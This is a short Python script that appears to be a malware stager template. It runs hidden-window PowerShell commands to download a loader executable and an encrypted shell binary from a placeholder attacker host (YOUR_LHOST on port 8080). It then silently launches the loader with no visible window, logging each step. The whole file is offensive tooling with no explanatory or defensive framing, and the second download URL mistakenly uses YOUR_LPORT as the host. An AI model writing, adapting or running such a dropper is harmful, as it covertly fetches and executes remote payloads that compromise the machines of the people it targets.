import os
import sys
import subprocess

def log_message(text):
    with open("log.txt", "a") as f:
        f.write(text + "\n")

try:
    loader_filename = "YOUR_LOADER_EXE_NAME.exe"
    encrypted_shell_bin_filename = "encrypted_shell.bin"
    port = 8080

    log_message("Attempting to download loader...")
    cmd_loader = f'powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri http://YOUR_LHOST:{port}/{loader_filename} -OutFile {loader_filename}"'
    os.system(cmd_loader)

    log_message("Attempting to download shell...")
    cmd_shell = f'powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri http://YOUR_LPORT:{port}/{encrypted_shell_bin_filename} -OutFile {encrypted_shell_bin_filename}"'
    os.system(cmd_shell)

    log_message(f"Current dir: {os.getcwd()}")
    log_message(f"Files present: {os.listdir('.')}")

    if os.path.isfile(loader_filename) and os.path.isfile(encrypted_shell_bin_filename):
        log_message("Successfully downloaded files.")
    else:
        log_message("Could not download required files.")
        sys.exit(1)

    log_message("Running loader...")
    subprocess.Popen(
        fr".\{loader_filename}",
        shell=True,
        creationflags=subprocess.CREATE_NO_WINDOW,
        cwd=os.getcwd()
    )
    log_message("Loader launched!")

except Exception as e:
    log_message(f"General error: {e}")